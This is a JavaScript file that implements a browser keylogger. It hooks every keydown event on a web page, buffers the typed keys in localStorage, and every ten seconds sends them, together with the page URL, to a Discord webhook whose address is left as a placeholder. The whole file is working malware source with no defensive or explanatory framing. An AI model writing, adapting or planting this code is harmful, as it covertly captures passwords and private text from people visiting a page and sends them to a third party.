var keys = "";
const discordWebhook = "web hook here";

document.addEventListener("keydown", (event) => {
  const key = event.key;
  if (key === "Enter") {
    keys += "\n";
  } else if (key === "Backspace") {
    keys = keys.slice(0, keys.length - 1);
  } else if (key !== "CapsLock" && key !== "Shift") {
    if (key === "Control") {
      keys += "[Ctrl]";
    } else if (key === "Alt") {
      keys += "[Alt]";
    } else if (key.startsWith("Arrow")) {
      keys += `[${key.replace("Arrow", "")}Arrow]`;
    } else {
      keys += key;
    }
  }
  //
  saveKeysLocal();
  //
});

window.setInterval(async () => {
  keys = getKeysLocal();
  if (keys === "") {
    return;
  }

  const message = `<${window.location.href}>\n:D: \`\`\`${keys}\`\`\``;
  await sendMessageToDiscord(discordWebhook, message);

  keys = "";
  saveKeysLocal();
}, 10000); // time in milliseconds

async function sendMessageToDiscord(webhook, msg) {
  try {
    const response = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: msg,
      }),
    });

    if (!response.ok) {
      console.error(`Failed to send message to Discord. Status: ${response.status}`);
    }
  } catch (error) {
    console.error("An error occurred while sending the message to Discord:", error);
  }
}

function saveKeysLocal() {
  localStorage.setItem("keys", keys);
}

function getKeysLocal() {
  return localStorage.getItem("keys");
}
